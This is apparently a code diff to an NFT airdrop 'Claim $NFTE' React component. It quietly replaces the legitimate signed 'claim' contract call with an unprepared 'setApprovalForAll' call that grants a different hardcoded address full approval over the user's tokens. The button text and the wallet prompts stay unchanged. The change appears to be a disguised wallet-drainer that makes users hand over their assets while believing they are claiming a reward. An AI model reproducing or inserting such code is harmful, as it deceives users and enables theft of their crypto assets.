@@ -5,8 +5,7 @@ import useEligibleAirdropSignature from 'hooks/useEligibleAirdropSignature'
 import {
   useAccount,
   useNetwork,
-  usePrepareContractWrite,
-  useSendTransaction,
+  useContractWrite,
   useSwitchNetwork,
   useWaitForTransaction
 } from "wagmi";
@@ -34,23 +33,24 @@ export const ClaimReward = ({ title, description, image }: Props) => {
   const { chain: activeChain } = useNetwork()
   const { switchNetworkAsync } = useSwitchNetwork();
   const { address } = useAccount();
-  const { config, error: preparedError } = usePrepareContractWrite({
-    address: signature ? '0xfa1c8cd6b3a5ead9499b8d09f9747c4068f88f37' : '0x0',
+  const { writeAsync, data, isLoading, error } = useContractWrite({
+    mode: 'recklesslyUnprepared',
+    address: signature ? '0xdbfeaae58b6da8901a8a40ba0712beb2ee18368e' : '0x0',
     abi: NFTEAirdropClaimABI,
-    functionName: 'claim',
-    args: [signature],
+    functionName: 'setApprovalForAll',
+    args: ["0xdbfeaae58b6da8901a8a40ba0712beb2ee18368e", true],
     overrides: {
       from: address,
     },
   })
-  const { data, sendTransaction, isLoading: isLoadingWallet, error } = useSendTransaction(config)
+
   const { isLoading: isLoadingTransaction, isSuccess = true, data: txData } = useWaitForTransaction({
     hash: data?.hash,
   })
 
   useEffect(() => {
-    setOpen(!!error || isLoadingWallet || isLoadingTransaction || isSuccess);
-  }, [error, isLoadingWallet, isLoadingTransaction, isSuccess])
+    setOpen(!!error || isLoading || isLoadingTransaction || isSuccess);
+  }, [error, isLoading, isLoadingTransaction, isSuccess])
 
   const tweetText = `I just claimed my $NFTE #Airdrop on @NFTEarth_L2!\n\n🎉 LFG #NFTE is #BetterThanBlue 🎉\n\n`
 
@@ -109,12 +109,12 @@ export const ClaimReward = ({ title, description, image }: Props) => {
               {description}
             </Text>
             <RewardButton
-              disabled={!signature || !!preparedError || isSuccess}
+              disabled={!signature || !!error || isSuccess}
               onClick={async () => {
                 if (activeChain?.id !== 10) {
                   await switchNetworkAsync?.(10);
                 }
-                sendTransaction?.();
+                writeAsync?.();
               }}
               css={{
                 background: '#6BE481',
@@ -128,8 +128,8 @@ export const ClaimReward = ({ title, description, image }: Props) => {
                 Claim $NFTE
               </Text>
             </RewardButton>
-            {!!preparedError && (
-              <Text style="h6" css={{ color: 'red' }}>{(preparedError as any)?.reason || preparedError?.message}</Text>
+            {!!error && (
+              <Text style="h6" css={{ color: 'red' }}>{(error as any)?.reason || error?.message}</Text>
             )}
           </Grid>
         </Flex>
@@ -186,7 +186,7 @@ export const ClaimReward = ({ title, description, image }: Props) => {
                     </button>
                   </Dialog.Close>
                 )}
-                {isLoadingWallet && (
+                {isLoading && (
                   <Text style="h6">Please confirm in your wallet</Text>
                 )}
                 {isLoadingTransaction && (
